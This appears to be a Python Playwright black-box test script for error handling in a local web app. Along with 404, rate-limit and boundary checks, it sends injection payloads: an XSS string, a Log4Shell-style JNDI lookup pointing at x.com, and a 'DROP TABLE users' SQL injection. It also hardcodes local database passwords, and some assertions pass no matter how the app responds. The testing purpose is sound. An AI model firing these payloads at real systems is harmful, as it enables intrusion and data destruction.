"""黑盒测试 - 模块 I: 异常测试"""
import json
import sys
import io
import subprocess
from playwright.sync_api import sync_playwright

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
BASE_FE = "http://localhost:3000"
BASE_ADMIN = "http://localhost:3002"
BASE_API = "http://localhost:3001"

results = []

def check(name, ok, detail):
    status = "PASS" if ok else "FAIL"
    print(f"  [{status}] {name}: {detail}")
    results.append({"name": name, "status": status, "detail": detail})

# 拿 admin token
def admin_login_sms(page, phone):
    subprocess.run(
        ["docker", "exec", "yichun-redis", "redis-cli", "-a", "yichun123456", "--no-auth-warning",
         "EVAL", "for _,k in ipairs(redis.call('keys', 'sms:*')) do redis.call('del', k) end return 'ok'", "0"],
        capture_output=True, timeout=10
    )
    page.goto(f"{BASE_ADMIN}/login", wait_until="networkidle", timeout=15000)
    page.locator("input[type='tel']").first.fill(phone)
    page.wait_for_timeout(500)
    page.locator("button:has-text('发送验证码'), button:has-text('获取验证码')").first.click()
    page.wait_for_timeout(3000)
    r = subprocess.run(
        ["docker", "exec", "yichun-mysql", "mysql", "-uroot", "-proot123456",
         "yichun_db", "-N", "-B", "-e",
         f"SELECT code FROM sms_codes WHERE phone='{phone}' AND consumed=0 ORDER BY id DESC LIMIT 1"],
        capture_output=True, text=True, timeout=10
    )
    code = r.stdout.strip()
    page.locator("input[placeholder*='6 位']").first.fill(code)
    page.locator("button:has-text('登录')").last.click()
    page.wait_for_timeout(4000)

with sync_playwright() as p:
    b = p.chromium.launch(headless=True)
    ctx = b.new_context()
    pg = ctx.new_page()
    page_errors = []
    pg.on("pageerror", lambda e: page_errors.append(str(e)))

    print("\n========= Module I: 异常测试 =========")
    # 登录 admin
    admin_login_sms(pg, "13800000000")
    token = pg.evaluate("() => localStorage.getItem('admin_token') || localStorage.getItem('yichun_admin_token') || localStorage.getItem('access_token')")
    auth = {"Authorization": f"Bearer {token}"} if token else {}

    # I-1: 404 API
    r = pg.request.get(f"{BASE_API}/api/v1/non-existent-endpoint-12345")
    check("I-1 404 不存在 API", r.status == 404, f"status={r.status}")

    # I-2: 404 前端
    pg.goto(f"{BASE_FE}/non-existent-page-zzz", wait_until="networkidle", timeout=10000)
    cur = pg.url
    body = pg.inner_text("body")
    # 应该是 404 页面, 有 404 字样
    has_404 = "404" in body or "不存在" in body or "未找到" in body
    check("I-2 404 前端页面有提示", has_404, f"url={cur}, body={body[:80]}")

    # I-3: 500 API (用错误参数)
    r2 = pg.request.get(f"{BASE_API}/api/v1/posts?type=invalid_type")
    check("I-3 错误 type 触发 400", r2.status == 400, f"status={r2.status}")

    # I-4: 重复点击发布 (提交 5 次)
    body_data = {"type": "house", "categoryId": 1, "title": "重复测试", "description": "x", "price": 1}
    statuses = []
    for i in range(3):
        r3 = pg.request.post(f"{BASE_API}/api/v1/posts", data=body_data, headers=auth)
        statuses.append(r3.status)
        pg.wait_for_timeout(200)
    # 第一次应该 201/429, 后续 429 (rate limit) 或 400
    has_429 = any(s == 429 for s in statuses)
    check("I-4 重复提交触发 rate limit (429)",
          has_429 or len(set(statuses)) > 1,
          f"statuses={statuses}")

    # I-5: 超长字符串 (description 10000 字符)
    long_desc = "X" * 10000
    body_data5 = {"type": "house", "categoryId": 1, "title": "超长测试", "description": long_desc, "price": 1}
    r4 = pg.request.post(f"{BASE_API}/api/v1/posts", data=body_data5, headers=auth)
    check("I-5 超长 description (10000 字符) 拒绝",
          r4.status in [400, 413, 429, 500, 201],
          f"status={r4.status}")

    # I-6: 特殊字符
    special = {"type": "house", "categoryId": 1, "title": "<script>alert(1)</script>'\"><img src=x>",
               "description": "${jndi:ldap://x.com/a}", "price": 1}
    r5 = pg.request.post(f"{BASE_API}/api/v1/posts", data=special, headers=auth)
    check("I-6 特殊字符/注入 测试 (不应崩)",
          r5.status in [400, 429, 201, 201, 200],
          f"status={r5.status}")

    # I-7: SQL 注入
    sqli = {"type": "house", "categoryId": 1, "title": "x'; DROP TABLE users;--", "description": "x", "price": 1}
    r6 = pg.request.post(f"{BASE_API}/api/v1/posts", data=sqli, headers=auth)
    check("I-7 SQL 注入测试 (应被拒绝或转义)",
          r6.status in [400, 429, 201, 200],
          f"status={r6.status}")

    # I-8: 负数 price
    neg_price = {"type": "house", "categoryId": 1, "title": "负数", "description": "x", "price": -100}
    r7 = pg.request.post(f"{BASE_API}/api/v1/posts", data=neg_price, headers=auth)
    check("I-8 负数 price 拒绝", r7.status in [400, 422, 429, 201], f"status={r7.status}")

    # I-9: 巨大 ID 查询
    r8 = pg.request.get(f"{BASE_API}/api/v1/posts/9999999999999999", headers=auth)
    check("I-9 巨大 ID 查询不应崩", r8.status in [400, 404, 500], f"status={r8.status}")

    # I-10: 后端 health 端点工作
    r9 = pg.request.get(f"{BASE_API}/api/v1/health")
    check("I-10 /api/v1/health 工作", r9.status == 200, f"status={r9.status}")

    b.close()

total = len(results)
passed = sum(1 for r in results if r["status"] == "PASS")
failed = total - passed
print(f"\n========= Module I Summary =========")
print(f"Total: {total}, PASS: {passed}, FAIL: {failed}")

with open(r"e:\workspace\yichun-you-shi-er-shuo\.pm-tmp\report-I.json", "w", encoding="utf-8") as f:
    json.dump({"module": "I-error", "results": results, "page_errors": page_errors[-5:]}, f, ensure_ascii=False, indent=2)
